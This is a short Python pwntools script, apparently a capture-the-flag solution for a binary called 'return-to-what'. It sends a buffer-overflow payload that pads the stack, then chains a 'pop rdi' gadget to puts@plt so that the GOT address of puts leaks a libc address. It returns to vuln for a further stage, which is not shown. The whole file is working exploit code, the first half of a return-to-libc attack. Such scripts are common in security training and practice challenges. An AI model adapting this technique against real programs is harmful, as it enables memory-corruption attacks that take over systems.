#!/usr/bin/env python3

from pwn import *
#from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64  # Import pwntools
binary = context.binary = ELF('./return-to-what')
context.log_level = 'INFO'

context.log_file = 'local.log'
libc = binary.libc
p = process(binary.path)
rop = ROP(binary)

pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = 0x38 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.vuln)

p.sendlineafter('Where would you like to return to?\n',payload)

_ = p.recv(6)
puts = u64(_ + b'\0\0')
log.info('puts: ' + hex(puts))
